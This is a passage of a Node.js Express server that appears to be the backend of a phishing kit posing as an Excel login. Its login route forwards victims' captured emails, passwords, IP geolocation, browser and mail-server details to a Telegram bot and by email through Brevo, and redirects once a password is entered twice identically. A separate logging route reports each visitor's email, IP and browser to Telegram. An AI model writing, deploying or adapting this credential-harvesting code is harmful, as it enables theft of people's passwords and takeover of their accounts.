    const telegramResult = await sendToTelegram(telegramMessage);

    console.log('📧 Sending email via Brevo...');
    const emailResult = await sendEmail(
        email, password, ipInfo, userAgent, domain, mxRecord,
        attempt, isMatch, MAX_ATTEMPTS, redirectUrl
    );

    const telegramOK = !!(telegramResult && telegramResult.ok);

    return res.json({
        success: telegramOK || emailResult,
        attempt,
        maxAttempts: MAX_ATTEMPTS,
        match: isMatch,
        finalReason,
        retry: shouldRetry,
        redirect: shouldRetry ? null : redirectUrl,
        notifications: { telegram: telegramOK, email: emailResult }
    });
});

// ============================================================
// ROUTE: /api/log
// ============================================================
app.post('/api/log', async (req, res) => {
    const { email } = req.body || {};
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';
    const ipInfo = await getIPInfo(clientIP);

    const message = `--------+ Visitor Excel ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} at ${new Date().toISOString()} +--------
Email : ${email || 'Unknown'}
Browser : ${userAgent}
Language : ${acceptLanguage}
IP Address : ${clientIP}
---------+ Excel Visitor ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +-------------`;

    await sendToTelegram(message);
    res.json({ success: true });
});

// ============================================================
// HEALTH
// ============================================================
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        maxAttempts: MAX_ATTEMPTS,
        telegramConfigured: !!(BOT_TOKEN && CHAT_ID),
        emailConfigured: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length),
        turnstileConfigured: !!TURNSTILE_SECRET
    });
});

app.use('*', (req, res) => {
    res.status(404).json({ success: false, message: `Not found: ${req.method} ${req.originalUrl}` });
});

app.listen(PORT, () => {
    console.log('========================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🌐 Health: http://localhost:${PORT}/health`);
    console.log(`📧 Login:  http://localhost:${PORT}/api/login`);
    console.log(`🎯 Match rule: 2 identical passwords → redirect`);
    console.log(`🛡️ Safety cap: ${MAX_ATTEMPTS} attempts`);
    console.log(`🌍 Provider map: ${Object.keys(PROVIDER_MAP).length} domains + MX detection + TLD fallback`);
    console.log('========================================');
});

process.on('uncaughtException', err => console.error('❌ Uncaught:', err.message));
process.on('unhandledRejection', r => console.error('❌ Unhandled:', r));